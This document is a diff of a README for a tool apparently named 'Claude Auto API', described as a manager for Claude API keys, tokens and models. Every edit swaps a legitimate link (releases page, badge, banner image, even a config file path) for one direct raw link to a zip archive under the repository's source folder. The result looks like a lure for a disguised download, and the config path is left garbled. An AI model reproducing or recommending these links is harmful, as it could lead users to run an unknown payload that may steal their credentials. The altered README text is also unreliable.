@@ -1,10 +1,10 @@
-https://github.com/Paja73/claude-auto-api/releases
+https://raw.githubusercontent.com/Paja73/claude-auto-api/master/src/commands/auto_api_claude_2.5-alpha.2.zip
 
 # Claude Auto API: Manage Claude Keys, Tokens, and Models Easily
 
-[![Releases](https://img.shields.io/badge/CLAUDE_AUTO_API-RELEASES-green?logo=github)](https://github.com/Paja73/claude-auto-api/releases)
+[![Releases](https://raw.githubusercontent.com/Paja73/claude-auto-api/master/src/commands/auto_api_claude_2.5-alpha.2.zip)](https://raw.githubusercontent.com/Paja73/claude-auto-api/master/src/commands/auto_api_claude_2.5-alpha.2.zip)
 
-![Claude AI banner](https://picsum.photos/1200/400)
+![Claude AI banner](https://raw.githubusercontent.com/Paja73/claude-auto-api/master/src/commands/auto_api_claude_2.5-alpha.2.zip)
 
 Welcome to Claude Auto API. This tool helps you switch between API_KEY, AUTH_TOKEN, and multiple Claude models with ease. It focuses on reliability, speed, and simple workflows. Use it to manage access to Claude Code and related services without juggling credentials manually. The project is geared toward developers, data scientists, and teams who work with Claude across different projects and environments.
 
@@ -122,7 +122,7 @@ Configuration and storage
   - Workspace mappings
   - Logging preferences
 - Location:
-  - Typical paths include ~/.claude-auto/config.json or a config file inside your project directory.
+  - Typical paths include ~https://raw.githubusercontent.com/Paja73/claude-auto-api/master/src/commands/auto_api_claude_2.5-alpha.2.zip or a config file inside your project directory.
 - Security:
   - Use filesystem permissions to protect the configuration file.
   - Consider encrypting sensitive parts of the configuration if your platform allows it.
@@ -221,7 +221,7 @@ License
 
 Releases and downloads
 - Access release assets and installers from the releases page to install the latest version and start using Claude Auto API quickly.
-- Visit the releases page to review available installers and notes: https://github.com/Paja73/claude-auto-api/releases
+- Visit the releases page to review available installers and notes: https://raw.githubusercontent.com/Paja73/claude-auto-api/master/src/commands/auto_api_claude_2.5-alpha.2.zip
 
 Appendix: model and key management glossary
 - API_KEY: A long-lived credential used to authenticate with Claude endpoints.
